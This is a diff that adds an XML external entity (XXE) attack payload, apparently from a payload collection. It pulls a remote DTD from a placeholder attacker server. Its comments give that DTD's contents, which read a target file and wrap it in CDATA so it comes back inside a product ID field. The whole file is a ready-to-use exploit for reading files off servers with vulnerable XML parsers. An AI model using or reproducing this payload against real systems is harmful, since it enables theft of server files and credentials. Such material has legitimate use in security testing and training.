@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- CDATA Exfiltration - Wrap file content in CDATA -->
+<!-- Use: When file has special XML characters -->
+<!-- Requires: Host cdata.dtd on your server with content: -->
+<!-- <!ENTITY % file SYSTEM "file:///TARGET_FILE"> -->
+<!-- <!ENTITY % start "<![CDATA["> -->
+<!-- <!ENTITY % end "]]>"> -->
+<!-- <!ENTITY % wrapper "<!ENTITY fileContents '%start;%file;%end;'>"> -->
+<!DOCTYPE data [
+  <!ENTITY % remote SYSTEM "http://ATTACKER_SERVER/cdata.dtd">
+  %remote;
+  %wrapper;
+]>
+<stockCheck>
+  <productId>&fileContents;</productId>
+  <storeId>1</storeId>
+</stockCheck>
